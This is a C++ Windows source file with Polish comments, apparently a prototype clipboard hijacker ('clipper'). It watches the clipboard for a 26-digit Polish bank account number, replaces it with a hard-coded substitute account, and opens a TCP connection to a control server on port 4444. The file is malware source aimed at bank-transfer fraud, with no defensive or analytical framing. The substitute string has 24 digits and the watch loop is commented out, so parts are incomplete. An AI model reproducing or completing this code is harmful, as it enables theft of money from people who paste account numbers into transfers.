#include <winsock2.h>
#include <windows.h>
#include <iostream>
#include <thread>
#include <string>
#include <cctype> 

#pragma comment(lib, "ws2_32.lib")

using namespace std;

const char* SERVER_IP = "127.0.0.1";
const int SERVER_PORT = 4444;

bool running = true;

//sprawdzam czy tekst == 26 cyfr nr konta
bool Is26Digits(const char* text) {
    if (strlen(text) != 26) {
        return false;  
    }

    for (size_t i = 0; i < 26; ++i) {
        if (!isdigit(text[i])) {
            return false;  
        }
    }
    return true;  
}
//zawartosc schowka
void ClipboardWatcher() {
    //while (running) {
        if (IsClipboardFormatAvailable(CF_TEXT)) {
            if (OpenClipboard(NULL)) {
                HANDLE hData = GetClipboardData(CF_TEXT);
                if (hData) {
                    char* pszText = static_cast<char*>(GlobalLock(hData));
                    if (pszText) {
                        if (Is26Digits(pszText)) {
                            cout << "Wykryto nr konta " << pszText << "\n";

                            // podmiana zawartosci schowka
                            EmptyClipboard();
                            const char* newText = "111122223333444455556666";  
                            HGLOBAL hGlob = GlobalAlloc(GMEM_MOVEABLE, strlen(newText) + 1);
                            memcpy(GlobalLock(hGlob), newText, strlen(newText) + 1);
                            GlobalUnlock(hGlob);
                            SetClipboardData(CF_TEXT, hGlob);

                            cout << "Podmieniono nr konta: " << newText << "\n";
                        }
                        else 
                        cout << "Nie ma 26 cyfr w schowku\n";
                    }
                    GlobalUnlock(hData);
                }
                CloseClipboard();
            }
        }
        Sleep(100);  
 //   }
}

// komunikacja z serwerem
void ConnectToServer() {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(SERVER_PORT);
    serverAddr.sin_addr.s_addr = inet_addr(SERVER_IP);

    if (connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        cout << "Nie mozna polaczyc z serwerem\n";
        return;
    }

    cout << "Polaczono z serwerem\n";

    char buffer[512];
    while (running) {
        int bytesReceived = recv(sock, buffer, sizeof(buffer) - 1, 0);
        if (bytesReceived <= 0) break;

        buffer[bytesReceived] = '\0';
        
    }

    closesocket(sock);
    WSACleanup();
}

int main() {
    thread tClipboard(ClipboardWatcher);
    ConnectToServer();

    running = false;
    tClipboard.join();
    return 0;
}
